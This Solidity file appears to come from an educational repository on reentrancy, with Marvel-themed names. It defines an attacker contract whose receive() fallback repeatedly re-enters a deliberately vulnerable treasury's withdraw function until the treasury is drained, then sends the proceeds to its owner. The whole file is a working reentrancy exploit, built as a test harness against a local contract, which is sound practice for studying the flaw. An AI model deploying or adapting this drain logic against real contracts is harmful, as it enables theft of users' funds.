// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {DormammuTreasuryVulnerable} from "../../src/Reentrancy-CEI/DormammuTreasuryVulnerable.sol";

/// @title Doctor Strange attacker (reentrancy) & Foundry test harness using TimeStone.
contract TimeStone {
    DormammuTreasuryVulnerable public treasury;
    address public owner;
    uint256 public rewardAmount;

    constructor(address _vuln) {
        treasury = DormammuTreasuryVulnerable(_vuln);
        owner = msg.sender;
    }

    /// @notice deposit and start the attack
    function attack() external payable {
        require(msg.sender == owner, "You're not a Doctor Strange");
        require(msg.value > 0, "send ETH to attack");
        // deposit small amount to be eligible for withdraw
        treasury.deposit{value: msg.value}();
        // set single-call baseline reward to attempt
        rewardAmount = msg.value;
        treasury.withdraw();
    }

    /// @notice fallback - reenter while the treasury still has funds
    receive() external payable {
        // while the treasury still has at least `rewardAmount`, reenter withdraw()
        // careful: this condition keeps reentering until the treasury is drained or < rewardAmount
        if (address(treasury).balance >= rewardAmount) {
            treasury.withdraw();
        }
    }

    /// @notice collect stolen funds to owner externally (for test reporting)
    function collect() external {
        require(msg.sender == owner, "You're not a Doctor Strange");
        payable(owner).transfer(address(this).balance);
    }
}
